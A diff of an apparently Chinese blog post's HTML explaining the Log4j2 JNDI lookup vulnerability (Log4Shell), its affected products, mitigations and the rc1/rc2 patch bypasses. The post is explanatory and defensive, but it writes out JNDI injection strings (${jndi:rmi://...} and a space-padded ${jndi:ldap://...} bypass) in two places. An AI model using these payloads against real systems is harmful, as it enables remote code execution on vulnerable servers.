@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">863</span>
+            <span class="post-count">1k</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -106,18 +106,16 @@
 <span id="more"></span>
 
 <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>攻击者可以通过 log4j 的 lookup 替换功能向其配置文件的任意位置注入代码（类似 SQL 注入，把 变量替换为{实际代码}），再加上这些版本中用到的 JNDI 特性并没有为 LDAP 提供足够的保护，使得注入的任意代码都能被执行。</p>
+<p>先说下利用exp：${jndi:rmi://127.0.0.1:1099/exp}   (rmi/ldap ，两者部分功能类似，但也有不同点)      再直白点来说就是 用户提交的${jndi:rmi://127.0.0.1:1099/exp} ，被日志捕获到，然后如果log4j2 又开启了 Jndi Lookup功能，就能解析用户提交的exp，发送rmi请求，远程调用一些反序类化的方法。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JNDI：Java 命名与目录接口，提供了用名称来访问资源的能力</span><br><span class="line">LDAP：轻型目录访问协议，定义了如何访问目录服务中的内容</span><br><span class="line"></span><br><span class="line">两者配合，可以完成对服务器目录的操作，比如增删改查。</span><br></pre></td></tr></table></figure>
 
 
 
-<p>源码：</p>
 <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
 <li>  Apache Log4j 2.x &lt; 2.15.0-rc2</li>
 <li><strong>供应链影响范围</strong></li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Spring-Boot-strater-log4j2</span><br><span class="line"></span><br><span class="line">Apache Struts2</span><br><span class="line"></span><br><span class="line">Apache Solr</span><br><span class="line"></span><br><span class="line">Apache Flink</span><br><span class="line"></span><br><span class="line">Apache Druid</span><br><span class="line"></span><br><span class="line">ElasticSearch</span><br><span class="line"></span><br><span class="line">Flume</span><br><span class="line"></span><br><span class="line">Dubbo</span><br><span class="line"></span><br><span class="line">Redis</span><br><span class="line"></span><br><span class="line">Logstash</span><br><span class="line"></span><br><span class="line">Kafka</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Spring-Boot-strater-log4j2</span><br><span class="line"></span><br><span class="line">Apache Struts2</span><br><span class="line"></span><br><span class="line">Apache Solr</span><br><span class="line"></span><br><span class="line">Dubbo</span><br><span class="line"></span><br><span class="line">Redis</span><br><span class="line"></span><br><span class="line">Logstash</span><br><span class="line"></span><br><span class="line">Kafka</span><br><span class="line"></span><br><span class="line">Apache Flink</span><br><span class="line"></span><br><span class="line">Apache Druid</span><br><span class="line"></span><br><span class="line">ElasticSearch</span><br><span class="line"></span><br><span class="line">Flume</span><br><span class="line"></span><br><span class="line">等</span><br></pre></td></tr></table></figure>
 
 
 
@@ -161,11 +159,16 @@
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/JtNoGVpDlom1kC3h9CoLTQ">参考1</a></p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4On4wXxchioqIHTsCJPq3w">原理参考2</a></p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IxXGcpjN6KkDGPQYPJXHTA">原理参考3</a></p>
-<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><h4 id="更新到rce1"><a href="#更新到rce1" class="headerlink" title="更新到rce1"></a>更新到rce1</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
-<p>但一会就被绕过了，经过测试发现<code>URI</code>中不进行<code>URL</code>编码会报这个错，加个空格即可触发<code>$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</code>（需要用户开启<code>lookup</code>功能的基础上才可以）</p>
-<h4 id="更新到rce2"><a href="#更新到rce2" class="headerlink" title="更新到rce2"></a>更新到rce2</h4><p>貌似又被绕过了</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><h4 id="补丁之前"><a href="#补丁之前" class="headerlink" title="补丁之前"></a>补丁之前</h4><ol>
+<li>可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。</li>
+<li>关闭<code>lookup</code>功能，即：设置 JVM 启动参数 - <code>Dlog4j2.formatMsgNoLookups=true</code></li>
+</ol>
+<h4 id="更新到rce1"><a href="#更新到rce1" class="headerlink" title="更新到rce1"></a>更新到rce1</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1%E3%80%82">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。</a></p>
+<p>但不久就被绕过了，经过测试发现<code>URI</code>中不进行<code>URL</code>编码会报这个错，加个空格即可触发<code>$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</code>（需要用户开启<code>lookup</code>功能的基础上才可以）</p>
+<h4 id="更新到rce2"><a href="#更新到rce2" class="headerlink" title="更新到rce2"></a>更新到rce2</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<p>貌似又被绕过了</p>
 <hr>
-<p>下次学习shiro漏洞原理</p>
+<p>下次分析下fastjson反序列化漏洞原理，和这个漏洞类似</p>
  
       <!-- reward -->
       
